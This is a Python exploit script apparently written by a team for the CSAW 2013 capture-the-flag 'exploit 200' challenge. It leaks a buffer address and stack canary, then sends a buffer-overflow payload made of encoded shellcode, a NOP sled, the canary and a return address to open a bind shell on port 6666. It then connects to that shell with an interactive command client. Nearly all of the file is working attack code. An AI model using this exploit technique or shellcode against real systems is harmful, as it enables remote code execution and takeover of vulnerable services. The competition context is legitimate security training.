
# ==============================================================================
#
# Exploit_200.py
#
# This program exploits the exploit 200 program for CSAW 2013 CTF
# the program leverages a buffer overflow to send and execute 
# shellcode that opens a bind shell that listens on port 6666 
# on the remote server
#
# Authors: Ryan Grandgenett 
# For:     CSAW 2013 (Team Nullify)
# Date:    September 19, 2013
#
# ==============================================================================

import socket
import time

#
# Method to send exploit when this method returns
# there should be a tcp bind shell on port 6666
# waiting for a connection on the remote server
#
def send_exploit(ip):

  # Shellcode that opens a bind shell that listens on port 6666 on the remote server
  shellcode = ("\xbe\x3b\xdc\xdb\x69\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
  "\x14\x31\x77\x14\x83\xef\xfc\x03\x77\x10\xd9\x29\xea\xb2\xea"
  "\x31\x5e\x06\x47\xdc\x63\x01\x86\x90\x02\xdc\xc8\x8a\x94\x8c"
  "\xa0\x2e\x29\x2b\x3a\x45\x39\x1a\x6a\x10\xd8\xf6\xec\x7a\xd6"
  "\x87\x79\x3b\xec\x34\x7d\x0c\x8a\xf7\xfd\x2f\xe3\x6e\x30\x2f"
  "\x90\x36\xa0\x0f\xcf\x05\xb4\x39\x96\x6d\xdc\x96\x47\xfd\x74"
  "\x81\xb8\x63\xed\x3f\x4e\x80\xbd\xec\xd9\xa6\x8d\x18\x17\xa8")

  # Set the buffer size 
  BUFF_SIZE = 2048

  # Create a socket to send the data to the server
  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  # Address and port of challenge
  client_socket.connect((ip, 31338))

  # Recieve and save the address of buf from
  # the remote server
  buf_address = client_socket.recv(4)

  # Recieve and save the canary value from
  # the remote server
  canary = client_socket.recv(4)

  # Create NOP sled 
  nop_sled = '\x90' * (BUFF_SIZE - len(shellcode))

  # Filler text used to get to RET value
  filler = 'A'*12

  # Expoit to send to server
  exploit = shellcode + nop_sled + canary + filler + buf_address

  # Send shellcode to the server
  client_socket.send(exploit)

  # Close the socket
  client_socket.close()

#
# Connect shell method used to interact with the
# remote tcp bind shell
#
def connect_shell(ip,port):

  noCommand = False
  
  sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sockfd.settimeout(0.1)
  sockfd.connect((ip, port)) 

  try:
    sockfd.sendall('whoami' + '\x0a')
    isRoot = sockfd.recv(1048576).strip()
    if isRoot == 'root':
      prompt = '#'
    else:
      prompt = '$'
    while True:
      try:
        cmd = raw_input(prompt + " ") 
        sockfd.sendall(cmd + '\x0a')
        if cmd == 'exit':
          sockfd.shutdown(0) 
          break
        result = sockfd.recv(1048576).strip()
        if not len(result):
          if noCommand == False: 
            sockfd.shutdown(0) 
            break
          else:
            noCommand = False
            sockfd.sendall(cmd + '\x0a')
            if cmd == 'exit':
              sockfd.shutdown(0) 
              break
            result = sockfd.recv(1048576).strip()
        if "/bin//sh" in result:
          result += '\n' + sockfd.recv(1048576).strip()
          noCommand = True
        print result
      except socket.error:
        pass
  except KeyboardInterrupt : #clean up code 
    sockfd.shutdown(0)



def main():

  #remote_server = '128.238.66.212'
  remote_server = 'localhost'

  # Send the exploit
  send_exploit(remote_server)
  
  time.sleep(.1)

  # Connect to bind shell
  connect_shell(remote_server, 6666)

 

# Hook
if __name__ == '__main__':
  main()
